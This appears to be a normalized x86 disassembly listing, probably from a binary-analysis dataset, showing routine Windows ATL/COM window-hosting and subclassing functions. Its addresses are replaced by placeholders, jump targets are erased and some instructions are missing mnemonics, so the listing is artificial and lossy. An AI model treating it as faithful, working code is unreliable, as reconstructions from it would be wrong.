lea ecx [ esp + 0x1c ]
push ecx
call sub_40a500
mov eax [ esp + 0x1c ]
mov edx [ esp + 0x20 ]
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x14 ]
call eax
mov ebx eax
sub_406440
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
mov eax 0x80004003
test esi esi
je r-xdata
pop esi
pop ebp
retn 0x8
push edi
mov edi [ ebp + 0x8 ]
mov [ esi ] 0x0
mov eax [ edi + 0x14 ]
test eax eax
je r-xdata
mov ecx [ edi - 0x4 ]
mov edx [ ecx ]
lea eax [ edi - 0x4 ]
push esi
push r--data
push eax
call edx
mov ecx [ eax ]
mov edx [ ecx ]
push esi
push r--data
push eax
call edx
test eax eax
jns r-xdata
pop edi
sub_406490
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi - 0x24 ]
push edi
push eax
call [ GetDC@IAT ]
mov edi eax
test edi edi
jne r-xdata
mov eax [ esi + 0x48 ]
test eax eax
je r-xdata
pop edi
mov eax 0x80004005
pop esi
pop ebp
retn 0x4
mov ecx [ esi - 0x24 ]
push edi
push ecx
call [ ReleaseDC@IAT ]
pop edi
xor eax eax
pop esi
pop ebp
retn 0x4
mov edx [ eax ]
push 0x0
push 0x0
lea ecx [ esi + 0x8c ]
push ecx
push ecx
push edi
push 0x0
push 0x0
push 0x0
push 0xffffffff
push 0x1
push eax
mov eax [ edx + 0xc ]
call eax
sub_406530
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx - 0x28 ]
mov [ eax ] edx
xor eax eax
pop ebp
retn 0x8
mov eax 0x80004005
pop ebp
retn 0x8
sub_406580
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0x38 ]
or [ esi + 0x6c ] 0x1
push 0x0
push 0x1
push eax
call [ OleLockRunning@IAT ]
mov eax [ esi + 0x38 ]
and [ esi + 0x6c ] 0xfffffff7
mov ecx [ eax ]
mov edx [ ecx ]
add esi 0x48
push esi
push r--data
push eax
call edx
xor eax eax
pop esi
pop ebp
retn 0x4
sub_4065d0
push ebp
mov ebp esp
push 0xffffffff
push sub_449853
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
xor eax eax
mov [ esi + 0x28 ] eax
lea ecx [ esi + 0x8 ]
mov [ esi + 0x4 ] eax
mov [ ebp - 0x10 ] ecx
mov [ ecx + 0xc ] eax
mov [ ebp - 0x4 ] 0x1
mov [ esi + 0x18 ] eax
mov [ esi + 0x1c ] eax
mov [ ebp - 0x4 ] 0x2
mov ecx [ DefWindowProcW@IAT ]
mov [ esi + 0x20 ] ecx
mov [ ebp - 0x4 ] 0x4
lea ecx [ esi + 0x2c ]
mov [ ebp - 0x10 ] ecx
mov [ ecx ] eax
mov [ ebp - 0x4 ] 0x7
mov ecx [ rw-data ]
mov [ esi ] r--data
mov [ esi + 0x24 ] r--data
mov edx [ ecx ]
mov eax [ edx + 0x4 ]
call eax
mov [ ebp - 0x4 ] 0xffffffff
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_406670
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_406890
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call [ operator delete@IAT ]
add esp 0x4
sub_4066b0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
dec [ eax + 0x4 ]
push esi
mov esi [ eax + 0x4 ]
jne r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
lea ecx [ eax - 0x24 ]
test ecx ecx
je r-xdata
mov eax [ ecx ]
mov edx [ eax + 0x4 ]
push 0x1
call edx
sub_4066e0
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
push ebx
push eax
lea ecx [ esi + 0x20 ]
push ecx
mov ebx rw-data
call sub_406b60
mov edx [ ebp + 0xc ]
add esp 0x8
push edx
push 0x0
push 0xcf0000
movzx ebx ax
mov eax [ ebp + 0x8 ]
push r--data
push eax
push 0x0
mov eax esi
call sub_430650
pop ebx
pop ebp
retn 0x8
mov [ rw-data ] 0x0
sub_406740
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0xc ]
push esi
push edi
test ebx ebx
jne r-xdata
mov edi [ ebp + 0x8 ]
cmp [ edi - 0x20 ] 0x0
jne r-xdata
mov eax 0x80004003
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
mov eax [ edi - 0x20 ]
pop edi
mov [ ebx ] eax
pop esi
xor eax eax
pop ebx
pop ebp
retn 0x8
push ecx
mov eax esp
mov [ eax ] 0x0
push ecx
mov eax esp
lea esi [ edi - 0x24 ]
mov [ eax ] 0x0
call sub_4066e0
sub_4067b0
push ebp
mov ebp esp
push 0xffffffff
push sub_44820a
mov eax [ fs : 0x0 ]
push eax
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
or ecx 0xffffffff
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x8 ]
add eax 0x8
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x4 ] ecx
mov eax [ eax + 0xc ]
test eax eax
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn 0x4
push eax
call sub_443ef4
sub_406810
push ebp
mov ebp esp
push 0xffffffff
push sub_448b09
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x0
lea eax [ esi + 0x2c ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x0
mov eax [ eax ]
test eax eax
je r-xdata
or ecx 0xffffffff
mov [ ebp - 0x4 ] ecx
lea eax [ esi + 0x8 ]
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x4 ] ecx
mov eax [ eax + 0xc ]
test eax eax
je r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
push eax
call sub_443ef4
sub_406890
push ebp
mov ebp esp
push 0xffffffff
push sub_4497e3
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ esi + 0x24 ] r--data
mov [ ebp - 0x4 ] 0x0
lea edi [ esi + 0x2c ]
mov [ esi + 0x28 ] 0xc0000001
mov eax [ edi ]
test eax eax
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov [ edi ] 0x0
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov ecx [ rw-data ]
mov eax [ ecx ]
mov edx [ eax + 0x8 ]
call edx
mov eax 0x1
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x14 ] edi
mov [ ebp - 0x4 ] al
mov eax [ edi ]
test eax eax
je r-xdata
push eax
call [ DestroyWindow@IAT ]
or ecx 0xffffffff
mov [ ebp - 0x4 ] ecx
lea eax [ esi + 0x8 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] ecx
mov eax [ eax + 0xc ]
test eax eax
je r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
push eax
call sub_443ef4
sub_406960
push ebp
mov ebp esp
push 0xffffffff
push sub_449f20
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov edi [ ebp + 0x8 ]
xor ebx ebx
cmp edi ebx
jne r-xdata
mov [ edi ] ebx
mov esi 0x8007000e
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x4 ] ebx
push 0x30
call [ operator new@IAT ]
add esp 0x4
cmp eax ebx
je r-xdata
mov eax 0x80004003
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
xor eax eax
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
push eax
call sub_4065d0
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
test eax eax
je r-xdata
mov [ edi ] eax
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
xor esi esi
sub_406a20
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0x8 ]
push edi
mov edi [ ebp + 0xc ]
push eax
add ecx 0xffffffdc
push ecx
mov eax r--data
call sub_40a210
pop edi
pop ebp
retn 0xc
sub_406a50
push ebp
mov ebp esp
push 0xffffffff
push sub_449853
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
xor eax eax
mov [ esi + 0x28 ] eax
lea ecx [ esi + 0x8 ]
mov [ esi + 0x4 ] eax
mov [ ebp - 0x10 ] ecx
mov [ ecx + 0xc ] eax
mov [ ebp - 0x4 ] 0x1
mov [ esi + 0x18 ] eax
mov [ esi + 0x1c ] eax
mov [ ebp - 0x4 ] 0x2
mov ecx [ DefWindowProcW@IAT ]
mov [ esi + 0x20 ] ecx
mov [ ebp - 0x4 ] 0x4
lea ecx [ esi + 0x2c ]
mov [ ebp - 0x10 ] ecx
mov [ ecx ] eax
mov [ ebp - 0x4 ] 0x7
mov ecx [ rw-data ]
mov [ esi ] r--data
mov [ esi + 0x24 ] r--data
mov edx [ ecx ]
mov eax [ edx + 0x4 ]
call eax
mov [ ebp - 0x4 ] 0xffffffff
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_406af0
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_4070e0
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call [ operator delete@IAT ]
add esp 0x4
sub_406b20
push ebp
mov ebp esp
push ecx
test eax eax
je r-xdata
xor eax eax
mov esp ebp
pop ebp
retn
push edi
push eax
call [ RegisterClassExW@IAT ]
movzx edi ax
mov [ ebp - 0x4 ] edi
test di di
je r-xdata
movzx eax di
pop edi
mov esp ebp
pop ebp
retn
push ebx
push esi
lea ebx [ ebp - 0x4 ]
mov esi rw-data
call sub_40af40
pop esi
pop ebx
sub_406b60
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_4481b8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x74
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x80 ]
mov [ fs : 0x0 ] eax
test ebx ebx
je r-xdata
xor eax eax
mov ecx [ esp + 0x80 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp [ ebx + 0x40 ] 0x0
jne r-xdata
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov [ esp + 0x14 ] rw-data
mov [ esp + 0x18 ] 0x0
mov [ esp + 0x88 ] 0x0
push rw-data
call [ EnterCriticalSection@IAT ]
cmp [ ebx + 0x40 ] 0x0
mov [ esp + 0x18 ] 0x1
jne r-xdata
mov ax [ ebx + 0x40 ]
mov ecx [ esp + 0x80 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
mov eax [ ebx + 0x34 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx ] eax
mov [ esp + 0x88 ] 0xffffffff
lea ecx [ esp + 0x14 ]
call sub_408e30
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x3c ]
mov ecx [ ebx + 0x38 ]
neg eax
sbb eax eax
not eax
and eax [ rw-data ]
push ecx
push eax
call [ LoadCursorW@IAT ]
mov [ ebx + 0x1c ] eax
mov ecx [ ebx + 0x28 ]
mov edx [ ebx + 0x8 ]
mov esi [ GetClassInfoExW@IAT ]
mov [ esp + 0xc ] ecx
lea ecx [ esp + 0x1c ]
push ecx
push eax
push 0x0
mov [ esp + 0x1c ] edx
mov [ esp + 0x28 ] 0x30
call esi
test eax eax
jne r-xdata
mov eax [ ebx + 0x28 ]
lea edx [ esp + 0x4c ]
push edx
mov ecx 0xc
mov esi ebx
lea edi [ esp + 0x50 ]
[ edi ] [ esi ]
mov ecx [ ebx + 0x14 ]
push eax
push ecx
call [ GetClassInfoExW@IAT ]
mov [ ebx + 0x40 ] ax
test ax ax
jne r-xdata
push ebx
push r--data
lea esi [ ebx + 0x42 ]
push 0x25
push esi
call [ swprintf_s@IAT ]
add esp 0x10
mov [ ebx + 0x28 ] esi
mov edx [ esp + 0xc ]
mov eax [ esp + 0x10 ]
mov ecx 0xc
lea esi [ esp + 0x1c ]
mov edi ebx
[ edi ] [ esi ]
mov ecx [ ebx + 0x8 ]
mov [ ebx + 0x34 ] ecx
mov [ ebx + 0x28 ] edx
mov [ ebx + 0x8 ] eax
jmp r-xdata
mov eax [ ebx + 0x30 ]
lea edx [ esp + 0x1c ]
push edx
push eax
mov eax [ rw-data ]
push eax
call esi
test eax eax
jne r-xdata
mov eax ebx
call sub_406b20
mov [ ebx + 0x40 ] ax
mov ecx [ rw-data ]
and [ ebx + 0x4 ] 0xffffbfff
cmp [ ebx + 0x28 ] 0x0
mov [ ebx + 0x14 ] ecx
jne r-xdata
mov [ esp + 0x88 ] 0xffffffff
lea ecx [ esp + 0x14 ]
call sub_408e30
sub_406d30
push ebp
mov ebp esp
push 0xffffffff
push sub_446618
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
xor edi edi
mov [ ebp - 0x14 ] rw-data
mov [ ebp - 0x10 ] 0x0
mov [ ebp - 0x4 ] edi
push rw-data
call [ EnterCriticalSection@IAT ]
mov esi [ rw-data ]
mov [ ebp - 0x10 ] 0x1
test esi esi
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
push rw-data
call [ LeaveCriticalSection@IAT ]
mov [ ebp - 0x10 ] 0x0
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
call [ GetCurrentThreadId@IAT ]
xor ecx ecx
test ecx ecx
jne r-xdata
mov ecx esi
mov esi [ esi + 0x8 ]
test esi esi
jne r-xdata
mov edx [ esi + 0x8 ]
mov [ ecx + 0x8 ] edx
mov eax [ esi + 0x8 ]
mov [ rw-data ] eax
jmp r-xdata
cmp [ esi + 0x4 ] eax
je r-xdata
jmp r-xdata
mov edi [ esi ]
sub_406de0
push ebp
mov ebp esp
sub esp 0x24
mov ecx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x14 ]
push esi
mov esi [ ebp + 0x8 ]
mov edx [ esi + 0x18 ]
mov eax [ esi + 0x4 ]
push edi
mov edi [ ebp + 0x10 ]
mov [ ebp - 0x20 ] ecx
xor ecx ecx
push ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp + 0x8 ] ecx
lea ecx [ ebp + 0x8 ]
push ecx
mov ecx [ ebp + 0xc ]
mov [ ebp + 0x10 ] edx
push ebx
lea edx [ ebp - 0x24 ]
push edi
mov [ esi + 0x18 ] edx
mov edx [ esi ]
mov edx [ edx ]
push ecx
push eax
mov ecx esi
mov [ ebp - 0x8 ] 0x24
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x18 ] ebx
call edx
test eax eax
jne r-xdata
mov eax [ esi + 0x1c ]
test al 0x1
je r-xdata
mov eax [ ebp + 0xc ]
cmp eax 0x82
je r-xdata
mov ecx [ ebp + 0x10 ]
mov eax [ ebp + 0x8 ]
pop edi
mov [ esi + 0x18 ] ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
xor edx edx
cmp [ ebp + 0x10 ] edx
jne r-xdata
mov eax [ esi + 0x4 ]
push 0xfffffffc
push eax
call [ GetWindowLongW@IAT ]
mov edx [ esi + 0x4 ]
push ebx
push edi
push 0x82
mov [ ebp + 0xc ] eax
mov eax [ esi + 0x20 ]
push edx
push eax
call [ CallWindowProcW@IAT ]
mov ecx [ esi + 0x20 ]
mov [ ebp + 0x8 ] eax
cmp ecx [ DefWindowProcW@IAT ]
je r-xdata
mov ecx [ esi + 0x20 ]
push ebx
push edi
push eax
mov eax [ esi + 0x4 ]
push eax
push ecx
call [ CallWindowProcW@IAT ]
mov [ ebp + 0x8 ] eax
jmp r-xdata
mov ecx [ esi + 0x4 ]
and eax 0xfffffffe
mov [ esi + 0x4 ] edx
mov [ esi + 0x18 ] edx
mov edx [ esi ]
mov [ esi + 0x1c ] eax
mov eax [ edx + 0xc ]
push ecx
mov ecx esi
call eax
mov eax [ ebp + 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
or [ esi + 0x1c ] 0x1
mov eax [ esi + 0x4 ]
push 0xfffffffc
push eax
call [ GetWindowLongW@IAT ]
cmp eax [ ebp + 0xc ]
jne r-xdata
mov edx [ esi + 0x20 ]
mov eax [ esi + 0x4 ]
push edx
push 0xfffffffc
push eax
call [ SetWindowLongW@IAT ]
sub_406f10
push ebp
mov ebp esp
push 0xffffffff
push sub_447158
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
test esi esi
je r-xdata
push 0x0
push 0x0
push 0x1
push 0xc0000005
call [ RaiseException@IAT ]
int3
test eax eax
je r-xdata
mov [ esi ] eax
call [ GetCurrentThreadId@IAT ]
mov [ esi + 0x4 ] eax
mov [ ebp - 0x14 ] rw-data
mov [ ebp - 0x10 ] 0x0
mov [ ebp - 0x4 ] 0x0
push rw-data
call [ EnterCriticalSection@IAT ]
mov eax [ rw-data ]
mov [ esi + 0x8 ] eax
mov [ ebp - 0x10 ] 0x1
mov [ rw-data ] esi
mov [ ebp - 0x4 ] 0xffffffff
push rw-data
call [ LeaveCriticalSection@IAT ]
mov [ ebp - 0x10 ] 0x0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn 0x4
sub_406fc0
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
push ebx
push eax
lea ecx [ esi + 0x20 ]
push ecx
mov ebx rw-data
call sub_406b60
mov edx [ ebp + 0xc ]
add esp 0x8
push edx
push 0x0
push 0xcf0000
movzx ebx ax
mov eax [ ebp + 0x8 ]
push r--data
push eax
push 0x0
mov eax esi
call sub_430650
pop ebx
pop ebp
retn 0x8
mov [ rw-data ] 0x0
sub_407020
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0xc ]
xor eax eax
test ebx ebx
setne al
push esi
push edi
test eax eax
jne r-xdata
mov edi [ ebp + 0x8 ]
cmp [ edi - 0x20 ] 0x0
jne r-xdata
mov eax 0x80004005
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
mov eax [ edi - 0x20 ]
pop edi
mov [ ebx ] eax
pop esi
xor eax eax
pop ebx
pop ebp
retn 0x8
push ecx
mov eax esp
mov [ eax ] 0x0
push ecx
mov eax esp
lea esi [ edi - 0x24 ]
mov [ eax ] 0x0
call sub_406fc0
sub_4070a0
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x8 ]
cmp [ edi + 0x8 ] esi
je r-xdata
pop edi
xor eax eax
pop esi
pop ebp
retn 0xc
test esi esi
je r-xdata
mov eax [ edi + 0x8 ]
test eax eax
je r-xdata
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
push esi
call ecx
mov [ edi + 0x8 ] esi
mov edx [ eax ]
push eax
mov eax [ edx + 0x8 ]
call eax
sub_4070e0
push ebp
mov ebp esp
push 0xffffffff
push sub_4497e3
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ esi + 0x24 ] r--data
mov [ ebp - 0x4 ] 0x0
lea edi [ esi + 0x2c ]
mov [ esi + 0x28 ] 0xc0000001
mov eax [ edi ]
test eax eax
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov [ edi ] 0x0
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov ecx [ rw-data ]
mov eax [ ecx ]
mov edx [ eax + 0x8 ]
call edx
mov eax 0x1
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x14 ] edi
mov [ ebp - 0x4 ] al
mov eax [ edi ]
test eax eax
je r-xdata
push eax
call [ DestroyWindow@IAT ]
or ecx 0xffffffff
mov [ ebp - 0x4 ] ecx
lea eax [ esi + 0x8 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] ecx
mov eax [ eax + 0xc ]
test eax eax
je r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
push eax
call sub_443ef4
sub_4071b0
push ebp
mov ebp esp
push 0xffffffff
push sub_449f00
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov edi [ ebp + 0x8 ]
xor ebx ebx
cmp edi ebx
jne r-xdata
mov [ edi ] ebx
mov esi 0x8007000e
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x4 ] ebx
push 0x30
call [ operator new@IAT ]
add esp 0x4
cmp eax ebx
je r-xdata
mov eax 0x80004003
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
xor eax eax
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
push eax
call sub_406a50
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
test eax eax
je r-xdata
mov [ edi ] eax
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
xor esi esi
sub_407270
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0x8 ]
push edi
mov edi [ ebp + 0xc ]
push eax
add ecx 0xffffffdc
push ecx
mov eax r--data
call sub_40a210
pop edi
pop ebp
retn 0xc
sub_4072a0
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
sub esp 0x8
test ecx ecx
je r-xdata
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
mov [ ecx ] 0x0
test ecx ecx
je r-xdata
mov [ eax ] 0x0
mov eax 0x80004003
mov esp ebp
pop ebp
retn 0x18
test eax eax
je r-xdata
cmp [ ebp + 0x14 ] 0x0
je r-xdata
cmp [ ebp + 0x18 ] 0x0
je r-xdata
push ebx
push esi
mov esi [ ebp + 0x8 ]
cmp [ esi + 0x3c ] 0x0
lea ebx [ esi + 0x3c ]
jne r-xdata
cmp [ esi + 0x40 ] 0x0
push edi
lea edi [ esi + 0x40 ]
jne r-xdata
lea eax [ ebp + 0x8 ]
push eax
call sub_406960
test eax eax
js r-xdata
mov eax [ ebx ]
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
mov ebx [ ebx ]
test ebx ebx
je r-xdata
lea eax [ ebp + 0x8 ]
push eax
call sub_4071b0
test eax eax
js r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x24 ]
mov edx [ ecx ]
add eax 0x24
push ebx
push r--data
push eax
call edx
mov ecx [ edi ]
mov edx [ ebp + 0x10 ]
mov [ edx ] ecx
mov edi [ edi ]
test edi edi
je r-xdata
mov edx [ ebx ]
mov eax [ edx + 0x4 ]
push ebx
call eax
pop edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x24 ]
mov edx [ ecx ]
add eax 0x24
push edi
push r--data
push eax
call edx
mov edx [ ebp + 0x14 ]
mov eax [ esi - 0x28 ]
mov edi [ GetClientRect@IAT ]
push edx
push eax
call edi
mov ecx [ ebp + 0x18 ]
mov edx [ esi - 0x28 ]
push ecx
push edx
call edi
cmp [ esi + 0x98 ] 0x0
jne r-xdata
mov eax [ edi ]
mov ecx [ eax + 0x4 ]
push edi
call ecx
mov edi [ ebp + 0x1c ]
mov [ edi ] 0x14
mov eax [ esi + 0x6c ]
shr eax 0x2
and eax 0x1
mov [ edi + 0x4 ] eax
mov ecx [ esi - 0x28 ]
push ecx
call [ GetParent@IAT ]
mov [ edi + 0x8 ] eax
mov edx [ esi + 0x98 ]
xor eax eax
mov [ edi + 0xc ] edx
cmp [ esi + 0x98 ] eax
setne al
mov [ edi + 0x10 ] eax
xor eax eax
push 0x1
lea edx [ ebp - 0x8 ]
xor eax eax
push edx
mov [ ebp - 0x8 ] 0x0
mov [ ebp - 0x6 ] eax
call [ CreateAcceleratorTableW@IAT ]
mov [ esi + 0x98 ] eax
sub_407410
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
and [ eax + 0x6c ] 0xfffffffe
mov ecx [ eax + 0x48 ]
test ecx ecx
je r-xdata
xor eax eax
pop ebp
retn 0x4
mov [ eax + 0x48 ] 0x0
mov eax [ ecx ]
push ecx
mov ecx [ eax + 0x8 ]
call ecx
sub_407440
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
test eax eax
jne r-xdata
mov ecx [ eax ]
mov edx [ eax + 0x4 ]
mov [ ebp - 0x14 ] ecx
mov ecx [ eax + 0x8 ]
push edi
mov edi [ ClientToScreen@IAT ]
mov [ ebp - 0x10 ] edx
mov edx [ eax + 0xc ]
lea eax [ ebp - 0x14 ]
mov [ ebp - 0xc ] ecx
mov ecx [ esi - 0x28 ]
push eax
push ecx
mov [ ebp - 0x8 ] edx
call edi
test eax eax
je r-xdata
mov eax 0x80004003
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_443fba
mov esp ebp
pop ebp
retn 0x8
mov ecx [ esi - 0x28 ]
push ecx
call [ GetParent@IAT ]
mov edi eax
test edi edi
je r-xdata
mov eax [ esi - 0x28 ]
lea edx [ ebp - 0xc ]
push edx
push eax
call edi
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
push 0x1
sub ecx eax
push ecx
mov ecx [ ebp - 0x14 ]
sub edx ecx
push edx
push eax
mov eax [ esi - 0x28 ]
push ecx
push eax
call [ MoveWindow@IAT ]
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
xor eax eax
pop esi
call sub_443fba
mov esp ebp
pop ebp
retn 0x8
push ebx
mov ebx [ ScreenToClient@IAT ]
lea edx [ ebp - 0x14 ]
push edx
push edi
call ebx
test eax eax
je r-xdata
pop ebx
lea eax [ ebp - 0xc ]
push eax
push edi
call ebx
sub_407510
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0x38 ]
or [ esi + 0x6c ] 0x1
push edi
push 0x0
push 0x1
push eax
call [ OleLockRunning@IAT ]
test [ ebp + 0x10 ] 0x1
je r-xdata
mov eax [ esi + 0x38 ]
and [ esi + 0x6c ] 0xfffffff7
mov ecx [ eax ]
mov edx [ ecx ]
lea edi [ esi + 0x48 ]
push edi
push r--data
push eax
call edx
mov eax [ esi + 0x38 ]
or [ esi + 0x6c ] 0x8
mov ecx [ eax ]
mov edx [ ecx ]
lea edi [ esi + 0x48 ]
push edi
push r--data
push eax
call edx
test eax eax
jns r-xdata
pop edi
xor eax eax
pop esi
pop ebp
retn 0xc
mov ecx [ edi ]
